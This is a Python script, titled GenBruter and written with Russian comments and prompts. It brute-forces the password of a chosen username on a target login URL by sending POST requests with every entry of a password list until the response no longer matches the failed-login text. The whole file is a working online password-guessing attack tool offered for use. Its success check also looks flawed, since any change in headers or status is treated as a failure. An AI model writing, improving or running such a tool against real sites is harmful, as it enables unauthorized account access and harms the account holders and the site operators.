import requests
import re
import os

# Логотип программы
logo = """
  /$$$$$$                      /$$$$$$$                        /$$                        
 /$$__  $$                    | $$__  $$                      | $$                        
| $$  \__/  /$$$$$$  /$$$$$$$ | $$  \ $$  /$$$$$$  /$$   /$$ /$$$$$$    /$$$$$$   /$$$$$$ 
| $$ /$$$$ /$$__  $$| $$__  $$| $$$$$$$  /$$__  $$| $$  | $$|_  $$_/   /$$__  $$ /$$__  $$
| $$|_  $$| $$$$$$$$| $$  \ $$| $$__  $$| $$  \__/| $$  | $$  | $$    | $$$$$$$$| $$  \__/
| $$  \ $$| $$_____/| $$  | $$| $$  \ $$| $$      | $$  | $$  | $$ /$$| $$_____/| $$      
|  $$$$$$/|  $$$$$$$| $$  | $$| $$$$$$$/| $$      |  $$$$$$/  |  $$$$/|  $$$$$$$| $$      
 \______/  \_______/|__/  |__/|_______/ |__/       \______/    \___/   \_______/|__/      
                                                                                                                                                                              
"""

# Функция для очистки экрана и вывода логотипа
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(logo.center(os.get_terminal_size().columns))

# Функция для ввода с проверкой на пустое значение
def get_input(prompt):
    value = input(prompt)
    while not value.strip():
        print("Поле не может быть пустым. Пожалуйста, введите значение.")
        value = input(prompt)
    return value

# Функция для проверки корректности URL
def validate_url(url):
    # Простой паттерн для проверки URL
    url_pattern = re.compile(
        r'^(https?://)?'  # схема (http или https) необязательна
        r'([a-zA-Z0-9.-]+)'  # доменное имя
        r'(\.[a-zA-Z]{2,6})'  # домен верхнего уровня
        r'(:\d+)?'  # порт необязателен
        r'(\/.*)?$'  # путь необязателен
    )
    return url_pattern.match(url)

# Очистка экрана и вывод логотипа
clear_screen()

# Приветствие и объяснение цели программы
print("Добро пожаловать в GenBruter!")
print("Эта программа выполняет перебор паролей для заданного пользователя.")
print()

# Ввод URL-адреса для отправки POST-запросов с проверкой корректности
while True:
    target_url = get_input("Введите URL для атаки (например, https://example.com/login) >>>   ")
    if validate_url(target_url):
        break
    else:
        print("Некорректный URL. Пожалуйста, введите корректный URL.")
print()

# Ввод имени пользователя для атаки
username = get_input("Введите имя пользователя (например, электронную почту) >>>   ")
print()

# Параметр, который указывает на отрицательный ответ сервера при неудачном логине
negative_response = get_input("Введите текст, указывающий на неудачный логин (например, 'Invalid') >>>   ")
print()

# Загрузка списка паролей из файла
try:
    with open('passwords.txt', 'r') as file:
        password_list = file.readlines()
except FileNotFoundError:
    print("Файл passwords.txt не найден. Убедитесь, что файл находится в той же директории, что и скрипт.")
    exit()


# Использование сессии для сохранения состояния между запросами
session = requests.Session()

# Получение содержимого страницы до попытки входа
initial_response = session.get(target_url)
initial_content = initial_response.content.decode()
initial_headers = initial_response.headers
initial_status = initial_response.status_code

# Перебор паролей из списка
for entry in password_list:
    current_password = entry.strip()
    response = session.post(target_url, data={'username': username, 'password': current_password}) # Отправка POST-запроса с введенными данными
    response_content = response.content.decode()  # Декодирование байтового контента в строку
    response_headers = response.headers
    response_status = response.status_code
    if (negative_response in response_content or
        response_content == initial_content or
        response_status != initial_status or
        response_headers != initial_headers): # Проверка на наличие отрицательного ответа или обновление страницы
        print(f"Пароль не найден")
    else:
        print(f"Пароль '{current_password}' найден для логина {username}!")
        break  # Остановка перебора при нахождении правильного пароля
else:
    print("Все пароли из списка были проверены. Пароль не найден.")
